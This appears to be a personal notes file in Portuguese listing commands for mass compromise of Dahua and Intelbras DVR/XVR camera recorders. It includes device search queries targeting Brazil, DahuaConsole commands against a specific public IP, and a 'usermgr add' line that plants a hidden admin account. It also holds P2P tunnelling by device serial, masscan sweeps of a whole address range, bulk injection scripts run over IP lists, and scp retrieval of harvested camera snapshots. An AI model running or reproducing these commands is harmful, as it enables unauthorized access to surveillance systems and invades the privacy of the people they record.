e roda, pra ver se conecta no console

/Console.py --proto dhip --rport 80 --logon loopback --rhost 101.190.9.204

Dahua product:"Dahua XVR" version:"3.218.0000001.4"

MHDX 5116 product:"Dahua MHDX 5116"

mhdx country:"BR" product:"Intelbras MHDX 5116"

MHDX 3008 country:"BR"

mhdx country:"BR" product:"Intelbras MHDX 1116" city:"São Paulo"

MHDX 1016

python3 Console.py --proto dhip --rport 80 --logon loopback --rhost 101.190.9.204

usermgr add pdr Senha@2026 admin

python3 Console.py --proto dhip --rport 8080 --logon loopback --rhost 127.0.0.1

./target/release/dh-p2p 3K04BD5PAG00028 -p 127.0.0.1:8080:80 --relay

.
.
.
.
.


Modo Massa: python3 dh.py -f ips.txt -p 80 -u admin -P Senha@2026
Modo Manual: python3 dh.py -i 192.168.0.15 -p 37777
Modo Interativo: python3 dh.py
Pega uma lista de ips do arquivo, e tenta injetar: python3 dh.py -f ips.txt -p 80 -u usr ou pdr -P Senha@2026


.
.
.
.
.
.


criando tunel com dh-p2p, e rodando (vai mais rápido)  

python3 dh.py -i 127.0.0.1 -p 8080


.
.
.

Comando blade:

python3 blade.py --tunnel -s seriais.txt

.
.
.

comando dvr2: 

python3 dhv2.py -f ips37777.txt -u pdr -P Senha@2026 -t 250

sudo masscan -p 37777 179.126.0.0-179.126.255.254 --rate 5000 -oL /home/ubuntu/DahuaConsole/ipsformatados.txt -e ens5

grep -E 'tcp (37776|37777|37778)' /home/ubuntu/DahuaConsole/ipsformatados.txt | awk '{print $4}' > /home/ubuntu/DahuaConsole/ips37777.txt

scp -r -i "C:\Users\LENOVO\Desktop\Ubuntu\chave-projeto.pem" ubuntu@3.82.175.239:/home/ubuntu/DahuaConsole/snapshots_20260603_151938 C:\Users\LENOVO\Desktop\

em último caso:

python3 dhv2.py -f ips37777.txt -p 8080 -u pdr -P Senha@2026 -t 250

grep 'open tcp 8080' ipsformatados.txt | awk '{print $4}' > ips_8080.txt
